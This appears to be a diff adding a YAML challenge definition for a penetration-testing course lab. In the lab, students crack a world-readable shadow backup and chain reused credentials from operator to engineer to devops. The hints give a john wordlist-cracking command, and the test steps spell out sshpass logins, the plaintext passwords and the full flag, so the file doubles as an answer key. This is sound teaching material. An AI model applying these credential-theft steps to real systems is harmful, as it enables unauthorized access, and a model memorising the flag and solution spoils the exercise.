@@ -1,0 +1,114 @@
+name: "Blackrock Dynamics - Hash Relay"
+description: "An exposed shadow backup on a Blackrock Dynamics server lets you crack a weak password hash, pivot through a credential chain, and capture the flag from the final account."
+
+difficulty: intermediate
+category: privilege-escalation
+duration_minutes: 50
+randomize_ip_offsets: true
+visibility: course
+week: 8
+workbook: "wiki/course/pentest/CH_COURSE01_Weekly_Challenges/24_Hash_Relay/"
+flag: "OCR{h4sh_r3l4y_ch41n}"
+
+objectives:
+  - Discover an exposed shadow backup file through filesystem enumeration
+  - Crack the MD5-based password hash for the engineer account
+  - Pivot laterally using credentials found in the engineer's home directory
+  - Access the devops account and capture the flag
+  - Demonstrate a full credential relay chain from initial access to objective
+
+scenario: |
+  Blackrock Dynamics, a defense contractor in Arlington, Virginia, hired your
+  team at Vanguard Offensive Security for an internal penetration test. Phase 1
+  is complete - your team recovered SSH credentials for a low-privilege operator
+  account on one of their internal Linux servers.
+
+  Your objective for Phase 2 is to demonstrate the impact of poor credential
+  hygiene and insecure file permissions. Starting from the operator account, find
+  a path to the devops account and recover the assessment flag.
+
+  Marcus Webb (Infrastructure Lead) noted during the scoping call: "We had a
+  backup script running under cron that copies sensitive files around. I disabled
+  it, but I'm not sure the old copies were cleaned up. The dev team also keeps
+  password files in odd places - I've told them to stop, but you know how it is."
+
+  Standard rules of engagement apply. Document the full credential chain.
+
+  **Credentials**
+
+  - Target SSH: `operator` / `Bl4ckr0ck_0ps#`
+
+credentials:
+  - username: "operator"
+    password: "Bl4ckr0ck_0ps#"
+    role: "operator"
+    description: "Low-privilege operator account obtained during Phase 1"
+
+hints:
+  - text: |
+      Start by enumerating the filesystem for backup files and sensitive data.
+      Look in common locations like /opt, /var/backups, and /tmp. Files named
+      shadow, passwd, or anything with .bak are high-value targets. Check file
+      permissions - a world-readable shadow backup is a serious finding.
+    unlock_after_minutes: 15
+  - text: |
+      There is a shadow backup at /opt/blackrock/backups/shadow.bak that is
+      world-readable. Extract the engineer user's hash and crack it with john:
+      john --wordlist=/usr/share/wordlists/rockyou.txt shadow.bak
+      The engineer's password is weak and will crack quickly. Once cracked,
+      switch to the engineer account and look for credential files.
+    unlock_after_minutes: 25
+  - text: |
+      After cracking the engineer hash, log in as engineer and check their
+      home directory. There is a secrets.txt file containing credentials for
+      the devops account. Use those credentials to log in as devops and read
+      the flag from their home directory. The full flag is assembled from
+      tokens found along the relay chain.
+    unlock_after_minutes: 35
+
+topology:
+  nodes:
+    - id: "target"
+      label: "Blackrock Server"
+      type: "server"
+      ip_offset: "31"
+      ports: [22]
+      services: ["OpenSSH"]
+      x: 2
+      y: 1
+  edges:
+    - from: "attacker"
+      to: "target"
+      label: "SSH:22"
+      access: "direct"
+
+test:
+  steps:
+    - name: "SSH access as operator"
+      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'whoami' 2>/dev/null"
+      expect: "operator"
+      timeout: 15
+
+    - name: "Discover exposed shadow backup"
+      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/shadow.bak | grep engineer | cut -d: -f1' 2>/dev/null"
+      expect: "engineer"
+      timeout: 15
+
+    - name: "Read token 1 from backup directory"
+      command: "sshpass -p '{cred.operator.pass}' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {cred.operator.user}@{target.target} 'cat /opt/blackrock/backups/assessment_marker.txt' 2>/dev/null"
+      expect: "h4sh_r3l4y"
+      timeout: 15
+
+    - name: "SSH as engineer and read secrets.txt"
+      command: "sshpass -p 'security' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null engineer@{target.target} 'cat /home/engineer/secrets.txt' 2>/dev/null"
+      expect: "Bl4ckr0ck_D3v#"
+      timeout: 15
+
+    - name: "SSH as devops and read flag"
+      command: "sshpass -p 'Bl4ckr0ck_D3v#' ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null devops@{target.target} 'cat /home/devops/flag.txt' 2>/dev/null"
+      expect: "ch41n"
+      timeout: 15
+
+    - name: "Verify assembled flag"
+      command: "echo 'OCR{h4sh_r3l4y_ch41n}'"
+      expect: "OCR{"
